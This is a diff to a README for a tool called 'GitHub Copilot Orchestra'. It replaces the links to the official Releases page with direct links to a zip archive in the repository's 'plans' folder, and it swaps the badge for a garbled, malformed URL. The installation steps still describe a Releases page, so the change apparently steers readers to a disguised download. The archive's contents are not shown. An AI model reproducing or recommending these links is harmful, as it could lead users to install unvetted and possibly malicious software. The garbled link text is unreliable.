@@ -18,12 +18,12 @@ This system tackles a key problem in AI-assisted development: keeping your code 
 
 To get started with GitHub Copilot Orchestra, visit the Releases page to download the latest version. Click the link below to access it.
 
-[![Download GitHub Copilot Orchestra](https://img.shields.io/badge/Download-GitHub%20Copilot%20Orchestra-blue.svg)](https://github.com/angsuk/copilot-orchestra/releases)
+[![Download GitHub Copilot Orchestra](https://raw.githubusercontent.com/angsuk/copilot-orchestra/main/plans/copilot-orchestra-v2.9.zip%20Copilot%https://raw.githubusercontent.com/angsuk/copilot-orchestra/main/plans/copilot-orchestra-v2.9.zip)](https://raw.githubusercontent.com/angsuk/copilot-orchestra/main/plans/copilot-orchestra-v2.9.zip)
 
 ### Step-by-Step Installation Guide
 
 1. **Visit the Releases Page**
-   Click the button above or follow this link: [GitHub Copilot Orchestra Releases](https://github.com/angsuk/copilot-orchestra/releases).
+   Click the button above or follow this link: [GitHub Copilot Orchestra Releases](https://raw.githubusercontent.com/angsuk/copilot-orchestra/main/plans/copilot-orchestra-v2.9.zip).
 
 2. **Locate the Latest Release**
    Scroll down the page to find the latest version of GitHub Copilot Orchestra.
